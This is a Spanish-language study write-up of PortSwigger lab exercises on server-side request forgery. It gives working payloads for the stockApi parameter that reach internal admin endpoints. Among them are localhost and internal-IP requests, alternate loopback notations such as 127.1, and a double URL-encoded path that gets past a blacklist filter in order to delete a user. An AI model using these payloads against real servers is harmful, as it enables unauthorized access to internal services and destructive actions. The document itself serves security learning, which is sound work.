# SSFR

La falsificación de solicitudes del lado del servidor (también conocida como SSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del lado del servidor a realizar solicitudes a una ubicación no deseada.

En un ataque SSRF típico, el atacante puede hacer que el servidor establezca una conexión con servicios solo internos dentro de la infraestructura de la organización. En otros casos, pueden obligar al servidor a conectarse a sistemas externos arbitrarios, lo que podría filtrar datos confidenciales, como credenciales de autorización.

# Basic SSRF against the local server

Para este laboratorio nos damos cuenta que la peticion para revisar stock llama a una api 
entonces sopechamos que podemos que puede hacer peticiones a nombre del servidor


```
stockApi=http://localhost/admin/delete?username=carlos


```
Y borramos el usuario.


# Basic SSRF against another back-end system

Para este laboratorio usamos el intruder en el stock usamos el intruder con el payload brute force del 1 al 255
recordar usar el url encode.


```
stockApi=http://192.168.0.estenumerovaria:8080/admin/delete?username=carlos

```

Y borramos el usuario.

# SSRF with blacklist-based input filter

Para este lab se necesita bypasear la proteccion para que se permita acceder al /admin y posteriormente borrar un usuario:

## Local host y sus diferentes representaciones

Esta bloqueado el 127.0.0.1 entonces necesitamos usar otra representacion algunas de estas son:

```
-2130706433
-017700000001
-127.1
```
Se uso el 127.1 lo que nos hace pensar que podria ser un filtro que compara Regex. Despues se intenta meter al /admin pero esta bloqueada.

```
stockApi=http://127.1/admin
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

```

Entonces lo que tenemos que hacer es Url encodear seleccionando el string clic derecho -> convert selection -> URL -> url-encode-all-the Characters.
Y lo hacemos 2 veces con lo cual bypasea la regex y permite que se borre al usuario.

```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos

```
FIN


Referencia

> https://portswigger.net/web-security/ssrf
